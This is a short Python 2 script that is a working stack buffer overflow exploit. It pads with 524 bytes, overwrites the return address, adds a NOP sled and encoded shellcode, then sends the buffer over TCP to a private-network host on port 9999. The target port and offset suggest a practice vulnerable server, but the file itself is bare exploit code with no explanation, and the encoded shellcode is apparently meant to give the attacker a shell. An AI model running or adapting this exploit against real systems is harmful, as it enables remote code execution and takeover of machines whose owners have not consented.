import socket
import sys
from time import sleep

shellcode = ("\xdb\xca\xba\x39\xcc\xf8\x8e\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x50\x13\x03\x69\xdf\x1a\x7b\x75\x37\x58"
"\x84\x85\xc8\x3d\x0c\x60\xf9\x7d\x6a\xe1\xaa\x4d\xf8\xa7\x46"
"\x25\xac\x53\xdc\x4b\x79\x54\x55\xe1\x5f\x5b\x66\x5a\xa3\xfa"
"\xe4\xa1\xf0\xdc\xd5\x69\x05\x1d\x11\x97\xe4\x4f\xca\xd3\x5b"
"\x7f\x7f\xa9\x67\xf4\x33\x3f\xe0\xe9\x84\x3e\xc1\xbc\x9f\x18"
"\xc1\x3f\x73\x11\x48\x27\x90\x1c\x02\xdc\x62\xea\x95\x34\xbb"
"\x13\x39\x79\x73\xe6\x43\xbe\xb4\x19\x36\xb6\xc6\xa4\x41\x0d"
"\xb4\x72\xc7\x95\x1e\xf0\x7f\x71\x9e\xd5\xe6\xf2\xac\x92\x6d"
"\x5c\xb1\x25\xa1\xd7\xcd\xae\x44\x37\x44\xf4\x62\x93\x0c\xae"
"\x0b\x82\xe8\x01\x33\xd4\x52\xfd\x91\x9f\x7f\xea\xab\xc2\x17"
"\xdf\x81\xfc\xe7\x77\x91\x8f\xd5\xd8\x09\x07\x56\x90\x97\xd0"
"\x99\x8b\x60\x4e\x64\x34\x91\x47\xa3\x60\xc1\xff\x02\x09\x8a"
"\xff\xab\xdc\x1d\xaf\x03\x8f\xdd\x1f\xe4\x7f\xb6\x75\xeb\xa0"
"\xa6\x76\x21\xc9\x4d\x8d\xa2\x36\x39\xa6\x3a\xdf\x38\xb8\x2b"
"\x43\xb4\x5e\x21\x6b\x90\xc9\xde\x12\xb9\x81\x7f\xda\x17\xec"
"\x40\x50\x94\x11\x0e\x91\xd1\x01\xe7\x51\xac\x7b\xae\x6e\x1a"
"\x13\x2c\xfc\xc1\xe3\x3b\x1d\x5e\xb4\x6c\xd3\x97\x50\x81\x4a"
"\x0e\x46\x58\x0a\x69\xc2\x87\xef\x74\xcb\x4a\x4b\x53\xdb\x92"
"\x54\xdf\x8f\x4a\x03\x89\x79\x2d\xfd\x7b\xd3\xe7\x52\xd2\xb3"
"\x7e\x99\xe5\xc5\x7e\xf4\x93\x29\xce\xa1\xe5\x56\xff\x25\xe2"
"\x2f\x1d\xd6\x0d\xfa\xa5\xf6\xef\x2e\xd0\x9e\xa9\xbb\x59\xc3"
"\x49\x16\x9d\xfa\xc9\x92\x5e\xf9\xd2\xd7\x5b\x45\x55\x04\x16"
"\xd6\x30\x2a\x85\xd7\x10")


buffer = 'A' * 524 + '\xF3\x12\x17\x31' + '\x90' * 32 + shellcode + 'C' * 139 
# 32 NO OPS are added as \x90
# c = 522-32-351

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.43.149',9999))
  s.recv(1024)

  print '[*] Sending buffer...'
  s.send(buffer + '\r\n')
  s.close()
  print '[!] Done.'

except:
  print '[!] Could not connect to target, exiting.'
  sys.exit()

